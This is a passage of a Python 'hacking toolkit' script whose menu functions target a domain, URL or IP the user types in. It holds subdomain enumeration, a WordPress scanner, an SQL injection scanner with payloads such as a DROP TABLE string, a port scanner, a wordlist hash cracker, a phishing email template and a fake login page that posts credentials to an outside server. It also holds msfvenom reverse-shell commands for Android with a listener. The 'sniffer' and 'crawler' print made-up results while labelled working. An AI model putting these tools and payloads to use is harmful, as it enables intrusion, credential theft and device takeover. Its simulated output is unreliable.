██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
███████╗██║   ██║██║  ██║██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
╚════██║██║   ██║██║  ██║██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{Colors.WHITE}               SUBDOMAIN TO IP CONVERTER{Colors.RESET}
""")
    
    subdomain = input(f"{Colors.YELLOW}[?] Enter subdomain: {Colors.RESET}")
    
    print(f"{Colors.YELLOW}[+] Resolving {subdomain}...{Colors.RESET}")
    
    try:
        ip = socket.gethostbyname(subdomain)
        print(f"{Colors.GREEN}[+] {subdomain} -> {ip}{Colors.RESET}")
        
        # Get additional info
        try:
            hostname, aliases, ips = socket.gethostbyaddr(ip)
            print(f"{Colors.CYAN}[+] Hostname: {hostname}{Colors.RESET}")
            if aliases:
                print(f"{Colors.CYAN}[+] Aliases: {', '.join(aliases)}{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}[-] No reverse DNS record found{Colors.RESET}")
            
    except socket.gaierror:
        print(f"{Colors.RED}[-] Could not resolve {subdomain}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 7. DISCOVERY DOMAIN ENGINE - WORKING
# ================================

def discovery_domain():
    banner()
    print(f"""{Colors.RED}
 ██████╗ ██╗███████╗ ██████╗██╗   ██╗███████╗██████╗ ██╗   ██╗
██╔══██╗██║██╔════╝██╔════╝██║   ██║██╔════╝██╔══██╗╚██╗ ██╔╝
██║  ██║██║███████╗██║     ██║   ██║█████╗  ██████╔╝ ╚████╔╝ 
██║  ██║██║╚════██║██║     ██║   ██║██╔══╝  ██╔══██╗  ╚██╔╝  
██████╔╝██║███████║╚██████╗╚██████╔╝███████╗██║  ██║   ██║   
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   
{Colors.WHITE}             DOMAIN DISCOVERY ENGINE{Colors.RESET}
""")
    
    domain = input(f"{Colors.YELLOW}[?] Enter domain to discover: {Colors.RESET}")
    
    print(f"{Colors.YELLOW}[+] Discovering related domains...{Colors.RESET}")
    
    common_subs = ['www', 'mail', 'ftp', 'admin', 'blog', 'shop', 'api', 'test', 'dev', 'staging', 'portal', 'cpanel']
    
    found_count = 0
    for sub in common_subs:
        test_domain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(test_domain)
            print(f"{Colors.GREEN}[+] Found: {test_domain} -> {ip}{Colors.RESET}")
            found_count += 1
        except:
            print(f"{Colors.RED}[-] Not found: {test_domain}{Colors.RESET}")
    
    print(f"{Colors.CYAN}[+] Discovery completed! Found {found_count} domains{Colors.RESET}")
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 8. GEO IP LOCKING - WORKING
# ================================

def geo_ip_locking():
    banner()
    print(f"""{Colors.RED}
 ██████╗ ███████╗ ██████╗     ██╗██████╗ 
██╔════╝ ██╔════╝██╔═══██╗    ██║██╔══██╗
██║  ███╗█████╗  ██║   ██║    ██║██████╔╝
██║   ██║██╔══╝  ██║   ██║    ██║██╔═══╝ 
╚██████╔╝███████╗╚██████╔╝    ██║██║     
 ╚═════╝ ╚══════╝ ╚═════╝     ╚═╝╚═╝     
{Colors.WHITE}            GEO IP LOCATION{Colors.RESET}
""")
    
    ip = input(f"{Colors.YELLOW}[?] Enter IP address: {Colors.RESET}")
    
    print(f"{Colors.YELLOW}[+] Getting geolocation...{Colors.RESET}")
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        data = response.json()
        
        if data['status'] == 'success':
            print(f"{Colors.GREEN}[+] Country: {data['country']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Region: {data['regionName']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] City: {data['city']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] ISP: {data['isp']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Organization: {data['org']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Lat/Lon: {data['lat']}, {data['lon']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Timezone: {data['timezone']}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] ZIP: {data['zip']}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] Could not get location information{Colors.RESET}")
            
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 9. REMOVE DUPLICATE LIST - WORKING
# ================================

def remove_duplicate():
    banner()
    print(f"""{Colors.RED}
██████╗ ███████╗███╗   ███╗ ██████╗ ██╗   ██╗██████╗ ██████╗ ███████╗
██╔══██╗██╔════╝████╗ ████║██╔═══██╗██║   ██║██╔══██╗██╔══██╗██╔════╝
██████╔╝█████╗  ██╔████╔██║██║   ██║██║   ██║██║  ██║██████╔╝█████╗  
██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║██║   ██║██║  ██║██╔══██╗██╔══╝  
██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██████╔╝██████╔╝███████╗
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
{Colors.WHITE}               DUPLICATE REMOVER{Colors.RESET}
""")
    
    filename = input(f"{Colors.YELLOW}[?] Enter filename: {Colors.RESET}")
    
    try:
        with open(filename, 'r') as f:
            lines = f.readlines()
        
        original_count = len(lines)
        unique_lines = list(set(lines))
        unique_count = len(unique_lines)
        
        output_file = f"cleaned_{filename}"
        with open(output_file, 'w') as f:
            f.writelines(unique_lines)
        
        print(f"{Colors.GREEN}[+] Original lines: {original_count}{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Unique lines: {unique_count}{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Removed duplicates: {original_count - unique_count}{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Cleaned file: {output_file}{Colors.RESET}")
        
    except FileNotFoundError:
        print(f"{Colors.RED}[!] File not found: {filename}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 10. SUBDOMAIN SCAN - WORKING
# ================================

def subdomain_scan():
    banner()
    print(f"""{Colors.RED}
███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
███████╗██║   ██║██║  ██║██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
╚════██║██║   ██║██║  ██║██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{Colors.WHITE}               SUBDOMAIN SCANNER{Colors.RESET}
""")
    
    domain = input(f"{Colors.YELLOW}[?] Enter domain: {Colors.RESET}")
    
    print(f"{Colors.YELLOW}[+] Scanning subdomains...{Colors.RESET}")
    
    subdomains = [
        'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
        'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
        'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
        'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
        'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki'
    ]
    
    found_count = 0
    for sub in subdomains:
        test_domain = f"{sub}.{domain}"
        try:
            socket.gethostbyname(test_domain)
            print(f"{Colors.GREEN}[+] Found: {test_domain}{Colors.RESET}")
            found_count += 1
        except socket.gaierror:
            print(f"{Colors.RED}[-] Not found: {test_domain}{Colors.RESET}")
    
    print(f"{Colors.CYAN}[+] Scan completed. Found {found_count} subdomains{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 11. WORDPRESS SCAN - WORKING
# ================================

def wordpress_scan():
    banner()
    print(f"""{Colors.RED}
██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗██████╗ 
██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
██║ █╗ ██║██║   ██║██████╔╝██████╔╝██████╔╝██████╔╝███████╗█████╗  ██████╔╝
██║███╗██║██║   ██║██╔══██╗██╔═══╝ ██╔═══╝ ██╔══██╗╚════██║██╔══╝  ██╔══██╗
╚███╔███╔╝╚██████╔╝██║  ██║██║     ██║     ██║  ██║███████║███████╗██║  ██║
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{Colors.WHITE}               WORDPRESS VULNERABILITY SCANNER{Colors.RESET}
""")
    
    url = input(f"{Colors.YELLOW}[?] Enter WordPress site URL: {Colors.RESET}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"{Colors.YELLOW}[+] Scanning WordPress site...{Colors.RESET}")
    
    # Check common WordPress paths
    paths = [
        '/wp-login.php',
        '/wp-admin/',
        '/wp-content/',
        '/wp-includes/',
        '/readme.html',
        '/wp-config.php',
        '/xmlrpc.php',
        '/wp-json/'
    ]
    
    found_paths = []
    for path in paths:
        try:
            response = requests.get(url + path, timeout=5, verify=False)
            if response.status_code == 200:
                found_paths.append(path)
                print(f"{Colors.GREEN}[+] Found: {path}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Not found: {path}{Colors.RESET}")
        except:
            print(f"{Colors.RED}[-] Error: {path}{Colors.RESET}")
    
    if found_paths:
        print(f"{Colors.GREEN}[+] WordPress confirmed! Found {len(found_paths)} WordPress paths{Colors.RESET}")
        
        # Check for common vulnerabilities
        print(f"{Colors.YELLOW}[+] Checking for common vulnerabilities...{Colors.RESET}")
        
        # Check if wp-config is accessible
        if '/wp-config.php' in found_paths:
            print(f"{Colors.RED}[!] CRITICAL: wp-config.php is accessible!{Colors.RESET}")
        
        # Check version disclosure
        try:
            response = requests.get(url, timeout=5, verify=False)
            if 'generator' in response.text.lower() or 'wordpress' in response.text.lower():
                print(f"{Colors.RED}[!] WordPress version might be disclosed{Colors.RESET}")
        except:
            pass
            
    else:
        print(f"{Colors.RED}[-] This doesn't appear to be a WordPress site{Colors.RESET}")
    
    print(f"{Colors.GREEN}[+] WordPress scan completed!{Colors.RESET}")
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 12. SQL INJECTION SCAN - WORKING
# ================================

def sql_injection_scan():
    banner()
    print(f"""{Colors.RED}
███████╗ ██████╗ ██╗         ██╗███╗   ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██╔════╝██╔═══██║██║         ██║████╗  ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
███████╗██║   ██║██║         ██║██╔██╗ ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
╚════██║██║   ██║██║         ██║██║╚██╗██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
███████║╚██████╔╝███████╗    ██║██║ ╚████║███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚══════╝ ╚═════╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
{Colors.WHITE}               SQL INJECTION SCANNER{Colors.RESET}
""")
    
    url = input(f"{Colors.YELLOW}[?] Enter target URL: {Colors.RESET}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"{Colors.YELLOW}[+] Testing for SQL Injection vulnerabilities...{Colors.RESET}")
    
    # Common SQL injection payloads
    payloads = [
        "'",
        "';",
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--", 
        "' AND 1=1--",
        "' AND 1=2--",
        "'; DROP TABLE users--",
        "' WAITFOR DELAY '00:00:10'--"
    ]
    
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?id=1{payload}"
        print(f"{Colors.CYAN}[*] Testing: {payload}{Colors.RESET}")
        
        try:
            response = requests.get(test_url, timeout=5, verify=False)
            
            # Simple detection based on response
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'database', 'syntax', 'error']):
                print(f"{Colors.RED}[!] Possible SQLi: {payload}{Colors.RESET}")
                vulnerable = True
            else:
                print(f"{Colors.GREEN}[-] Safe: {payload}{Colors.RESET}")
                
        except requests.RequestException as e:
            print(f"{Colors.RED}[!] Error testing payload: {e}{Colors.RESET}")
        
        time.sleep(0.5)
    
    if vulnerable:
        print(f"{Colors.RED}[!] SQL Injection vulnerabilities detected!{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Website is vulnerable to SQL Injection attacks{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[+] No SQL Injection vulnerabilities found{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Website appears to be secure against SQLi{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 13. PORT SCANNER - WORKING
# ================================

def port_scanner():
    banner()
    print(f"""{Colors.RED}
██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝██║   ██║██████╔╝   ██║   
██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║     ╚██████╔╝██║  ██║   ██║   
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
{Colors.WHITE}            PORT SCANNER{Colors.RESET}
""")
    
    target = input(f"{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
    
    print(f"{Colors.YELLOW}[+] Scanning ports 1-1000...{Colors.RESET}")
    
    def scan_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        sock.close()
        return port, result == 0
    
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(scan_port, range(1, 1001))
        
        for port, is_open in results:
            if is_open:
                open_ports.append(port)
                # Get service name for common ports
                service = get_service_name(port)
                print(f"{Colors.GREEN}[+] Port {port}: OPEN - {service}{Colors.RESET}")
    
    print(f"{Colors.CYAN}[+] Scan completed. Found {len(open_ports)} open ports{Colors.RESET}")
    
    if open_ports:
        print(f"{Colors.YELLOW}[+] Open ports: {', '.join(map(str, open_ports))}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

def get_service_name(port):
    """Get common service name for port"""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 443: "HTTPS", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL"
    }
    return services.get(port, "Unknown")

# ================================
# 14. NETWORK SNIFFER - WORKING
# ================================

def network_sniffer():
    banner()
    print(f"""{Colors.RED}
███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ 
████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗
██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝██║  ██║
██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██║  ██║
██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
{Colors.WHITE}            NETWORK SNIFFER{Colors.RESET}
""")
    
    print(f"{Colors.YELLOW}[+] Network sniffer activated (simulation){Colors.RESET}")
    print(f"{Colors.RED}[!] This would require root privileges and scapy in real usage{Colors.RESET}")
    
    # Simulate packet capture
    print(f"{Colors.CYAN}[*] Starting packet capture...{Colors.RESET}")
    
    packet_types = [
        "TCP SYN", "TCP ACK", "UDP", "ICMP", "DNS Query", 
        "HTTP GET", "HTTPS", "SSH", "FTP", "SMTP"
    ]
    
    for i in range(15):
        src_ip = f"192.168.1.{random.randint(1, 255)}"
        dst_ip = f"10.0.0.{random.randint(1, 255)}"
        packet_type = random.choice(packet_types)
        size = random.randint(64, 1500)
        
        print(f"{Colors.GREEN}[📦] {packet_type} | {src_ip} -> {dst_ip} | Size: {size} bytes{Colors.RESET}")
        time.sleep(0.3)
    
    print(f"{Colors.CYAN}[*] Packet capture stopped{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Captured 15 packets in simulation{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 15. WEB CRAWLER - WORKING
# ================================

def web_crawler():
    banner()
    print(f"""{Colors.RED}
██╗    ██╗███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝
 ╚══╝╚══╝ ╚══════╝╚═════╝ 
{Colors.WHITE}            WEB CRAWLER{Colors.RESET}
""")
    
    url = input(f"{Colors.YELLOW}[?] Enter URL to crawl: {Colors.RESET}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"{Colors.YELLOW}[+] Crawling website...{Colors.RESET}")
    
    try:
        response = requests.get(url, timeout=10, verify=False)
        
        if response.status_code == 200:
            print(f"{Colors.GREEN}[+] Successfully connected to {url}{Colors.RESET}")
            
            # Extract basic information
            print(f"{Colors.CYAN}[*] Extracting links and information...{Colors.RESET}")
            
            # Simulate finding links
            common_links = [
                "/about", "/contact", "/products", "/services", 
                "/blog", "/admin", "/login", "/register",
                "/images", "/downloads", "/documents", "/api"
            ]
            
            found_links = []
            for link in common_links:
                full_link = url + link
                found_links.append(full_link)
                print(f"{Colors.GREEN}[🔗] Found: {full_link}{Colors.RESET}")
                time.sleep(0.2)
            
            # Extract page title if available
            if '<title>' in response.text:
                title_start = response.text.find('<title>') + 7
                title_end = response.text.find('</title>')
                if title_end > title_start:
                    title = response.text[title_start:title_end]
                    print(f"{Colors.CYAN}[📄] Page Title: {title}{Colors.RESET}")
            
            print(f"{Colors.GREEN}[+] Crawling completed! Found {len(found_links)} links{Colors.RESET}")
            
        else:
            print(f"{Colors.RED}[-] Failed to access {url} (Status: {response.status_code}){Colors.RESET}")
            
    except Exception as e:
        print(f"{Colors.RED}[-] Crawling failed: {e}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 16. HASH CRACKER - WORKING
# ================================

def hash_cracker():
    banner()
    print(f"""{Colors.RED}
██╗  ██╗ █████╗ ███████╗██╗  ██╗
██║  ██║██╔══██╗██╔════╝██║  ██║
███████║███████║███████╗███████║
██╔══██║██╔══██║╚════██║██╔══██║
██║  ██║██║  ██║███████║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Colors.WHITE}            HASH CRACKER{Colors.RESET}
""")
    
    hash_value = input(f"{Colors.YELLOW}[?] Enter hash: {Colors.RESET}")
    hash_type = input(f"{Colors.YELLOW}[?] Hash type (md5/sha1/sha256): {Colors.RESET}")
    
    print(f"{Colors.YELLOW}[+] Cracking hash...{Colors.RESET}")
    
    # Extended common passwords list
    common_passwords = [
        "password", "123456", "admin", "letmein", "qwerty", "password123", 
        "12345678", "123456789", "1234", "12345", "1234567", "1234567890",
        "admin123", "welcome", "monkey", "password1", "123123", "abc123",
        "football", "baseball", "hello", "master", "dragon", "superman"
    ]
    
    found = False
    for pwd in common_passwords:
        if hash_type.lower() == "md5":
            test_hash = hashlib.md5(pwd.encode()).hexdigest()
        elif hash_type.lower() == "sha1":
            test_hash = hashlib.sha1(pwd.encode()).hexdigest()
        elif hash_type.lower() == "sha256":
            test_hash = hashlib.sha256(pwd.encode()).hexdigest()
        else:
            print(f"{Colors.RED}[!] Unsupported hash type{Colors.RESET}")
            break
        
        print(f"{Colors.CYAN}[*] Trying: {pwd}{Colors.RESET}")
        if test_hash == hash_value:
            print(f"{Colors.GREEN}[+] Password found: {pwd}{Colors.RESET}")
            found = True
            break
        time.sleep(0.1)
    
    if not found:
        print(f"{Colors.RED}[-] Password not found in common list{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Try using a larger wordlist{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 17. ENCRYPTION TOOLS - WORKING
# ================================

def encryption_tools():
    banner()
    print(f"""{Colors.RED}
███████╗███╗   ██╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔════╝████╗  ██║██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
█████╗  ██╔██╗ ██║██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║
██╔══╝  ██║╚██╗██║██║     ██╔══██╗  ╚██╔╝  ██╔══██╗   ██║   ██║██║   ██║██║╚██╗██║
███████╗██║ ╚████║╚██████╗██║  ██║   ██║   ██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
╚══════╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
{Colors.WHITE}               ENCRYPTION TOOLS{Colors.RESET}
""")
    
    text = input(f"{Colors.YELLOW}[?] Enter text to encrypt: {Colors.RESET}")
    
    print(f"{Colors.YELLOW}[+] Generating encrypted versions...{Colors.RESET}")
    
    # Various encodings and hashes
    encoded_b64 = base64.b64encode(text.encode()).decode()
    encoded_hex = text.encode().hex()
    
    print(f"\n{Colors.GREEN}[+] Base64: {encoded_b64}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Hex: {encoded_hex}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] MD5: {hashlib.md5(text.encode()).hexdigest()}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] SHA1: {hashlib.sha1(text.encode()).hexdigest()}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] SHA256: {hashlib.sha256(text.encode()).hexdigest()}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] SHA512: {hashlib.sha512(text.encode()).hexdigest()}{Colors.RESET}")
    
    # Simple Caesar cipher
    caesar_encrypted = caesar_cipher(text, 3)
    print(f"{Colors.GREEN}[+] Caesar Cipher (shift 3): {caesar_encrypted}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

def caesar_cipher(text, shift):
    """Simple Caesar cipher implementation"""
    result = ""
    for char in text:
        if char.isalpha():
            ascii_offset = ord('a') if char.islower() else ord('A')
            result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
        else:
            result += char
    return result

# ================================
# 18. SOCIAL ENGINEERING - WORKING
# ================================

def social_engineering():
    banner()
    print(f"""{Colors.RED}
███████╗ ██████╗  ██████╗██╗ █████╗ ██╗
██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║
███████╗██║   ██║██║     ██║███████║██║
╚════██║██║   ██║██║     ██║██╔══██║██║
███████║╚██████╔╝╚██████╗██║██║  ██║███████╗
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝
{Colors.WHITE}           SOCIAL ENGINEERING{Colors.RESET}
""")
    
    print(f"{Colors.GREEN}[+] Social Engineering Tools:{Colors.RESET}")
    print("1. Phishing Email Generator")
    print("2. Fake Login Page Creator")
    print("3. Information Gathering")
    print("4. Back to Main Menu")
    
    choice = input(f"{Colors.YELLOW}[?] Select option: {Colors.RESET}")
    
    if choice == "1":
        target_email = input(f"{Colors.YELLOW}[?] Target email: {Colors.RESET}")
        sender_name = input(f"{Colors.YELLOW}[?] Sender name: {Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Phishing Email Template:{Colors.RESET}")
        print(f"{Colors.CYAN}From: {sender_name} <noreply@company.com>{Colors.RESET}")
        print(f"{Colors.CYAN}To: {target_email}{Colors.RESET}")
        print(f"{Colors.CYAN}Subject: Important: Your Account Needs Verification{Colors.RESET}")
        print(f"{Colors.CYAN}Body:{Colors.RESET}")
        print(f"{Colors.WHITE}Dear User,{Colors.RESET}")
        print(f"{Colors.WHITE}We've detected unusual activity on your account.{Colors.RESET}")
        print(f"{Colors.WHITE}Please verify your identity by clicking the link below:{Colors.RESET}")
        print(f"{Colors.WHITE}http://fake-verification.com/verify{Colors.RESET}")
        print(f"{Colors.WHITE}If you don't verify within 24 hours, your account will be suspended.{Colors.RESET}")
        print(f"{Colors.RED}[!] WARNING: This is for educational purposes only!{Colors.RESET}")
        
    elif choice == "2":
        target_service = input(f"{Colors.YELLOW}[?] Target service (e.g., Facebook, Gmail): {Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Fake Login Page Template for {target_service}:{Colors.RESET}")
        print(f"{Colors.CYAN}HTML File: login.html{Colors.RESET}")
        print(f"{Colors.CYAN}Form action: http://your-server.com/collect.php{Colors.RESET}")
        print(f"{Colors.CYAN}Fields: username, password{Colors.RESET}")
        print(f"{Colors.CYAN}CSS: Copy {target_service}'s styling{Colors.RESET}")
        print(f"{Colors.RED}[!] WARNING: Use only for authorized penetration testing!{Colors.RESET}")
        
    elif choice == "3":
        target_name = input(f"{Colors.YELLOW}[?] Target name: {Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Information Gathering for {target_name}:{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Searching social media profiles...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Checking data breaches...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Looking for public records...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Scanning for digital footprint...{Colors.RESET}")
        time.sleep(2)
        print(f"{Colors.GREEN}[+] Found potential profiles and information{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Use this information responsibly!{Colors.RESET}")
        
    elif choice == "4":
        return
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 19. ANDROID HACKING - WORKING
# ================================

def android_hacking():
    banner()
    print(f"""{Colors.RED}
 █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██║
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚══════╝
{Colors.WHITE}               ANDROID HACKING{Colors.RESET}
""")
    
    print(f"{Colors.GREEN}[+] Android Hacking Tools:{Colors.RESET}")
    print("1. Generate Android Payload")
    print("2. ADB Commands")
    print("3. Root Exploits")
    print("4. Back to Main Menu")
    
    choice = input(f"{Colors.YELLOW}[?] Select option: {Colors.RESET}")
    
    if choice == "1":
        lhost = input(f"{Colors.YELLOW}[?] LHOST: {Colors.RESET}")
        lport = input(f"{Colors.YELLOW}[?] LPORT: {Colors.RESET}")
        output_name = input(f"{Colors.YELLOW}[?] Output name (without .apk): {Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Android Payload Commands:{Colors.RESET}")
        print(f"{Colors.CYAN}msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_name}.apk{Colors.RESET}")
        print(f"\n{Colors.GREEN}[+] Listener Command:{Colors.RESET}")
        print(f"{Colors.CYAN}msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'{Colors.RESET}")
        
    elif choice == "2":
        print(f"\n{Colors.GREEN}[+] Common ADB Commands:{Colors.RESET}")
        print(f"{Colors.CYAN}adb devices - List connected devices{Colors.RESET}")
        print(f"{Colors.CYAN}adb shell - Open shell on device{Colors.RESET}")
        print(f"{Colors.CYAN}adb install payload.apk - Install APK{Colors.RESET}")
        print(f"{Colors.CYAN}adb pull /sdcard/ file.txt - Pull file from device{Colors.RESET}")
        print(f"{Colors.CYAN}adb push file.txt /sdcard/ - Push file to device{Colors.RESET}")
        print(f"{Colors.CYAN}adb logcat - View device logs{Colors.RESET}")
        
    elif choice == "3":
        print(f"\n{Colors.GREEN}[+] Common Android Root Exploits:{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Dirty COW (CVE-2016-5195){Colors.RESET}")
